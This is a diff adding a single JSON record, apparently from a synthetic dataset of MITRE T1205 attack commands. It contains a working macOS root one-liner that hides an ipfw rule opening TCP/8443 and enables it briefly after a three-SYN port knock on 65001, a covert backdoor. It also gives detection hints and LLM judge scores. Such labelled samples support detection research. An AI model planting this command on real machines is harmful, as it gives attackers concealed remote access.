@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'ipfw add set 5 500 allow tcp from any to me 8443 in; ipfw set disable 5; tcpdump -ln -i en0 -c 3 \"tcp[13] & 2 != 0 and dst port 65001\" >/dev/null && ipfw set enable 5; sleep 120; ipfw set disable 5'",
+  "explanation": "Prepares a hidden ipfw rule in set 5 for TCP/8443, disabled by default. After three SYNs to port 65001 (knock), enables the set for 120 seconds, then disables it. Requires root.",
+  "rationale_steps": [
+    "Stage a dormant rule set and use a repeated knock as activation.",
+    "Enable rule set only on receipt of the expected signal and revert after a timer.",
+    "Detection: audit ipfw set enable/disable events; watch for repeated SYNs to 65001; port 8443 exposure spikes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-202bdfd7",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct nested quoting, valid command separators, appropriate flags for all tools, and no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the claimed intent of using a three-SYN port knock on 65001 to semantically trigger the temporary enablement of a hidden firewall rule for TCP/8443, directly embodying the T1205 Traffic Signaling technique through sequence-based triggers.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:12:50.454232Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
